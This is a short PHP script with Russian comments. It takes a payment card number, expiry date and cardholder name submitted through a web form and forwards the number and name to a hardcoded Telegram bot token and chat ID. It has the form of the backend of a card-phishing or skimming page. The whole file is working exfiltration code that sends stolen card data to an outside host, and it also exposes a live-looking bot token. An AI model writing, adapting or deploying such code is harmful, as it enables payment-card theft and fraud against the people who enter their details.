<?php

/* https://api.telegram.org/bot5311242440:AAF1Ow7jZZByo2W3AgYdqD2d50WhqN2tJP8/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$cardcode = $_POST['cardcode'];
$carddate = $_POST['carddate'];
$cardname = $_POST['cardname'];
$token = "5311242440:AAF1Ow7jZZByo2W3AgYdqD2d50WhqN2tJP8";
$chat_id = "1737562313";
$arr = array(
  'Номер карты: ' => $cardcode,
  'Имя владельца: ' => $cardname
);

foreach($arr as $key => $value) {
  $txt = $txt."<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  echo "ok";
} else {
  echo "Error";
}
?>